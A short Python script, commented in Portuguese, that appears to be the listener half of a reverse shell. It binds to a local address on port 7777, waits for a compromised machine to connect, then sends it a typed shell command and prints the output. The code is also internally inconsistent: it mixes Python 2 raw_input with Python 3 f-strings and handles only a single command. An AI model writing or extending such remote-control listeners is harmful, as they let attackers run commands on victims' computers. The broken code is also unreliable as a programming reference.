#!/usr/bin/env python
#_*_codings: utf8_*_

import socket

def shell():
    current_dir = target.recv(1024)
    comando = raw_input("{}~#" .format(current_dir))
    target.send(comando)
    res = target.recv(1024)
    print(res)

def upserver():
    global server
    global ip
    global target

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('192.168.18.10', 7777))
    server.listen(1)

    print('Servidor processando, esperando uma conexao...')

    target, ip = server.accept()
    print(f'Conexao recebida {ip[0]}')



upserver()
shell()
server.close()